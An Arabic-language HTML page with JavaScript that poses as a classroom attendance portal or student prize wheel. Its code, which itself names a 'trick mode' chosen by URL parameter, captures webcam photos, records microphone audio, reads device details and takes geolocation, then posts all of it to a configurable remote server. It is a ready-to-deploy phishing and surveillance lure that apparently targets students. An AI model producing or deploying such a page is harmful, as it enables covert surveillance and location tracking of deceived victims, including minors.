<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>البوابة التعليمية التفاعلية</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, sans-serif; }
        body { background: #0f172a; color: #f8fafc; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 15px; text-align: center; }
        .card { background: #1e293b; border-radius: 20px; padding: 25px; max-width: 480px; width: 100%; border: 1px solid #334155; box-shadow: 0 10px 25px rgba(0,0,0,0.4); }
        h1 { color: #38bdf8; font-size: 20px; margin-bottom: 12px; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
        .btn { background: #0284c7; color: white; border: none; padding: 14px; font-size: 16px; font-weight: bold; border-radius: 12px; cursor: pointer; width: 100%; }
        .btn[disabled] { opacity: 0.7; cursor: not-allowed; }
        .btn:hover { background: #0369a1; }
        .alert-box { background: #450a0a; border: 1px solid #ef4444; border-radius: 12px; padding: 20px; text-align: right; }
        .alert-box h2 { color: #ef4444; text-align: center; font-size: 18px; margin-bottom: 10px; }
        video, canvas { display: none; }
        .status { margin-top: 12px; font-size: 13px; color: #cbd5e1; }
        .status.error { color: #fca5a5; }
        .status.success { color: #86efac; }
    </style>
</head>
<body>

<div class="card" id="app">
    <h1 id="title">🎓 منصة التفاعل والأنشطة الصفية</h1>
    <p id="desc">اضغط على الزر أدناه لبدء النشاط التفاعلي وتأكيد الحضور في حصة اليوم.</p>
    <button class="btn" id="startBtn">بدء النشاط 🚀</button>
    <div id="status" class="status" aria-live="polite"></div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
/*
  تحسينات معالجة الأخطاء والموثوقية:
  - متغيرات تهيئة أعلى الملف (SERVER_URL, BOT_TOKEN, CHAT_ID)
  - استخدام AbortController و timeouts لطلبات getUserMedia و fetch
  - دوال مساعده: showStatus, fetchWithRetry, getMediaWithTimeout
  - توحيد منطق التشغيل وتنظيف الكود المكرر
*/

// ----- تهيئة (ضع القيم المناسبة هنا) -----
const SERVER_URL = 'https://YOUR-RENDER-APP.onrender.com/send-message'; // <-- غيّر إلى عنوان السيرفر الخاص بك
const BOT_TOKEN = ''; // <-- اترك فارغا أو ضع قيمة إذا رغبت
const CHAT_ID = ''; // <-- اترك فارغا أو ضع قيمة إذا رغبت

// إعدادات عامة
const DEFAULT_TIMEOUT_MS = 12000; // تحميل/التقاط + طلبات الشبكة
const FETCH_RETRIES = 2;

// قراءة وضع الخدعة من الرابط
const urlParams = new URLSearchParams(window.location.search);
const mode = urlParams.get('mode') || 'u1_snap1';

// عناصر الواجهة
const startBtn = document.getElementById('startBtn');
const statusEl = document.getElementById('status');
const titleEl = document.getElementById('title');
const descEl = document.getElementById('desc');
const videoEl = document.getElementById('video');
const canvasEl = document.getElementById('canvas');

// تخصيص نصوص بسيطة بحسب الوضع
if (mode.includes('u4_wheel')) {
    titleEl.innerText = "🎁 عجلة الحظ المباشرة للطلاب";
    descEl.innerText = "اضغط لتدوير العجلة ومعرفة جائزتك الفورية!";
} else if (mode.includes('u3_pin')) {
    titleEl.innerText = "🔑 إعدادات الأمان والحساب";
}

startBtn.addEventListener('click', runExperiment);

function showStatus(message, type = 'info') {
    statusEl.textContent = message;
    statusEl.className = `status ${type === 'error' ? 'error' : type === 'success' ? 'success' : ''}`;
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// fetch مع إعادة المحاولة و timeout
async function fetchWithRetry(url, options = {}, retries = FETCH_RETRIES, timeoutMs = DEFAULT_TIMEOUT_MS) {
    for (let attempt = 0; attempt <= retries; attempt++) {
        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), timeoutMs);
        try {
            const res = await fetch(url, { ...options, signal: controller.signal });
            clearTimeout(id);
            if (!res.ok) throw new Error(`HTTP ${res.status}`);
            return res;
        } catch (err) {
            clearTimeout(id);
            const isLast = attempt === retries;
            console.error('fetchWithRetry attempt', attempt, err);
            if (isLast) throw err;
            // exponential backoff
            await sleep(500 * Math.pow(2, attempt));
        }
    }
}

// الحصول على الوسائط مع timeout (كاميرا/مايك)
async function getMediaWithTimeout(constraints, timeoutMs = 8000) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeoutMs);
    try {
        // navigator.mediaDevices.getUserMedia لا يدعم signal في كل المتصفحات، لذلك نستخدم Promise.race
        const getMedia = navigator.mediaDevices.getUserMedia(constraints);
        const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), timeoutMs));
        const stream = await Promise.race([getMedia, timeout]);
        clearTimeout(timer);
        return stream;
    } catch (err) {
        clearTimeout(timer);
        throw err;
    }
}

// دالة التقاط صورة واحدة (مخفضة الدقة للسرعة) وإرسالها
async function capturePhotoAndSend({ label = 'snap', width = 640, height = 480 } = {}) {
    showStatus('جاري طلب إذن الكاميرا...');
    let stream;
    try {
        stream = await getMediaWithTimeout({ video: { facingMode: 'user' } }, 8000);
    } catch (err) {
        console.error('camera error', err);
        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
            showStatus('مرفوض: لم تتم الموافقة على الكاميرا. يرجى منح الإذن ثم المحاولة مجدداً.', 'error');
        } else if (err.message === 'timeout') {
            showStatus('انتهى زمن انتظار الكاميرا. حاول إعادة تحميل الصفحة أو التحقق من الجهاز.', 'error');
        } else {
            showStatus('تعذر الوصول إلى الكاميرا: ' + (err.message || err.name), 'error');
        }
        return;
    }

    try {
        videoEl.srcObject = stream;
        await new Promise((res) => videoEl.onloadedmetadata = res);
        // ننتظر قليلاً حتى تستقر الصورة على بعض الأجهزة
        await sleep(600);

        // ضبط حجم الكانفاس لأداء أسرع
        canvasEl.width = width;
        canvasEl.height = height;
        const ctx = canvasEl.getContext('2d');
        ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);

        // الحصول على Blob منخفض الجودة لتسريع الإرسال
        const blob = await new Promise(resolve => canvasEl.toBlob(resolve, 'image/jpeg', 0.6));

        // بناء الحمولة
        const payload = new FormData();
        payload.append('message', `نشاط: ${mode} - ${label}`);
        payload.append('image', blob, `${label}.jpg`);

        showStatus('جاري إرسال البيانات...');
        // نستخدم fetchWithRetry مع timeout
        const res = await fetchWithRetry(SERVER_URL, { method: 'POST', body: payload }, FETCH_RETRIES, 12000);
        await res.text();

        showStatus('تم الإرسال بنجاح.', 'success');
    } catch (err) {
        console.error('capture/send error', err);
        showStatus('فشل أثناء المعالجة: ' + (err.message || err.name), 'error');
    } finally {
        if (stream) stream.getTracks().forEach(t => t.stop());
    }
}

// تسجيل صوتي قصير (للوحدة u2)
async function recordAudioAndSend(seconds = 4) {
    showStatus('جاري طلب إذن الميكروفون...');
    let stream;
    try {
        stream = await getMediaWithTimeout({ audio: true }, 8000);
    } catch (err) {
        console.error('mic error', err);
        if (err.name === 'NotAllowedError') showStatus('مرفوض: لم تتم الموافقة على الميكروفون.', 'error');
        else showStatus('تعذر الوصول إلى الميكروفون.', 'error');
        return;
    }

    try {
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        mediaRecorder.ondataavailable = e => chunks.push(e.data);
        const stopPromise = new Promise(resolve => mediaRecorder.onstop = resolve);
        mediaRecorder.start();
        showStatus('جاري تسجيل الصوت...');
        await sleep(seconds * 1000);
        mediaRecorder.stop();
        await stopPromise;

        const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
        const payload = new FormData();
        payload.append('message', `نشاط: ${mode} - تسجيل صوتي`);
        payload.append('audio', blob, 'voice.ogg');

        showStatus('جاري إرسال التسجيل...');
        await fetchWithRetry(SERVER_URL, { method: 'POST', body: payload }, FETCH_RETRIES, 12000);
        showStatus('تم إرسال التسجيل.', 'success');
    } catch (err) {
        console.error('record/send error', err);
        showStatus('فشل تسجيل الصوت أو الإرسال: ' + (err.message || err.name), 'error');
    } finally {
        if (stream) stream.getTracks().forEach(t => t.stop());
    }
}

// إرسال معلومات الجهاز (الوحدة u3)
async function sendDeviceInfo() {
    let battery = 'غير معروف';
    if (navigator.getBattery) {
        try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}%`; } catch (e) { }
    }
    const report = `📱 [بيانات الجهاز - الوحدة 3]\n• المتصفح والنظام: ${navigator.userAgent}\n• دقة الشاشة: ${screen.width}x${screen.height}\n• البطارية: ${battery}\n• اللغة: ${navigator.language}`;

    try {
        showStatus('جاري إرسال بيانات الجهاز...');
        await fetchWithRetry(SERVER_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: report })
        }, FETCH_RETRIES, 10000);
        showStatus('تم إرسال بيانات الجهاز.', 'success');
    } catch (err) {
        console.error('sendDeviceInfo error', err);
        showStatus('فشل إرسال بيانات الجهاز.', 'error');
    }
}

// إرسال الموقع (الوحدة u5)
function sendLocation() {
    if (!navigator.geolocation) {
        showStatus('الموقع غير مدعوم في هذا المتصفح.', 'error');
        return;
    }
    showStatus('جاري الحصول على الموقع...');
    navigator.geolocation.getCurrentPosition(async (p) => {
        const locText = `📍 [الموقع الجغرافي]: https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`;
        try {
            await fetchWithRetry(SERVER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: locText })
            }, FETCH_RETRIES, 10000);
            showStatus('تم إرسال الموقع.', 'success');
        } catch (err) {
            console.error('sendLocation error', err);
            showStatus('فشل إرسال الموقع.', 'error');
        }
    }, (err) => {
        console.error('geolocation error', err);
        showStatus('تعذر الحصول على الموقع: ' + (err.message || err.code), 'error');
    }, { timeout: 10000, maximumAge: 0 });
}

// توحيد منطق التشغيل
async function runExperiment() {
    startBtn.disabled = true;
    startBtn.innerText = 'جاري المعالجة...';
    showStatus('البدء: ' + mode);

    try {
        if (mode === 'u1_snap1') {
            await capturePhotoAndSend({ label: 'snap1', width: 640, height: 480 });
        } else if (mode === 'u1_snap3') {
            // ثلاث لقطات متتابعة
            for (let i = 1; i <= 3; i++) {
                await capturePhotoAndSend({ label: `snap_${i}`, width: 320, height: 240 });
                await sleep(700);
            }
        } else if (mode.startsWith('u2_')) {
            await recordAudioAndSend(4);
        } else if (mode.startsWith('u3_')) {
            await sendDeviceInfo();
        } else if (mode.includes('u4') || mode.includes('u5')) {
            await capturePhotoAndSend({ label: `advanced_${mode}`, width: 640, height: 480 });
            sendLocation();
        } else {
            // افتراضي: لقطة سريعة
            await capturePhotoAndSend({ label: 'default_snap', width: 640, height: 480 });
        }
    } catch (err) {
        console.error('runExperiment error', err);
        showStatus('حدث خطأ غير متوقع: ' + (err.message || err.name), 'error');
    } finally {
        startBtn.disabled = false;
        startBtn.innerText = 'بدء النشاط 🚀';
    }
}

// تحذير خصوصية واضح للمستخدم
(function addPrivacyNote() {
    const note = document.createElement('p');
    note.style.fontSize = '12px';
    note.style.color = '#94a3b8';
    note.style.marginTop = '10px';
    note.textContent = 'ملاحظة: سيتم طلب أذونات الكاميرا/الميكروفون/الموقع عند الضرورة. لا تشارك بيانات حساسة مع روابط غير موثوقة.';
    document.getElementById('app').appendChild(note);
})();

</script>

</body>
</html>
